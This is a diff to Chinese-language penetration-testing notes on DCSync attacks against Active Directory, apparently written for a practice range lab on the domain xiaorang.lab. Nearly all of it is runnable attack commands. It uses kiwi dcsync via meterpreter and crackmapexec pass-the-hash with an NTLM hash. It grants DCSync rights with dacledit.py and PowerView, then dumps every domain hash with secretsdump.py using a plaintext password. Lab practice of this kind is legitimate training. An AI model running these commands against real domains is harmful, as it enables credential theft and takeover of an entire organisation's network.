@@ -263,6 +263,7 @@ DCSync 攻击前提 一个用户想发起 DCSync 攻击，必须获得以下任�
 - Administrators 组内的用户
 - Domain Admins 组内的用户
 - Enterprise Admins 组内的用户
+- ACL_ADMIN组 有WriteDACL权限
 - 域控制器的计算机帐户
 - 即：默认情况下域管理员组具有该权限。所以在域渗透中拿到域管理员账号就可以变相拿到整个域的控制权限。
 
@@ -273,19 +274,16 @@ meterpreter > kiwi_cmd "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
 ```
 
-示例 2
-
+#### 添加 DCSync 权限, 见 春秋云境——Exchange/Delivery
 ```sh
-
-```
-
-#### 添加 DCSync 权限, 见 春秋云境——Exchange
-
-```
-方式一
+# 方式一
 proxychains python3 dacledit.py xiaorang.lab/XIAORANG-EXC01\$ -hashes :0beff597ee3d7025627b2d9aa015bf4c -action write -rights DCSync -principal Zhangtong -target-dn 'DC=xiaorang,DC=lab' -dc-ip 172.22.3.2
-方式二
+# 方式二
 powershell -command "cd C:/Users/benbi/Desktop/; Import-Module .\powerview.ps1; Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIde Zhangtong -Rights DCSync -Verbose"
+# 完整的 Add-DomainObjectAcl -TargetIdentity 'DC=xiaorang,DC=lab' -PrincipalIdentity chenglei -Rights DCSync -Verbose
+
+# 导出域内hash
+proxychains python3 secretsdump.py xiaorang.lab/chenglei:Xt61f3LBhg1@172.22.13.6 -just-dc
 ```
 
 ### DC Takeover
